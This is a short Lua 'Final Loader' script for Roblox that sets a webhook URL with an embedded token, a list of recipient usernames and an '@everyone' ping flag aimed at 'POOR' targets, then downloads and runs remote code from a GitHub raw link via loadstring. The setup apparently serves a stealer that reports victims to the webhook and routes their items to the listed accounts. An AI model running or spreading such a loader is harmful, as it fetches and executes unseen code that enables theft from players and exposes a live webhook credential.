-- Final Loader (Fixed Webhook)

_G.POOR_WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/1494345282455077055/1fHPDJmkKw3RMjcdJ9vI2vgK-L50LoDMECcqwHUE"

_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}
-- Change "username" to any of your Roblox usernames if you want

_G.PING_POOR = true   -- true = loud @everyone ping | false = no ping

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
end)
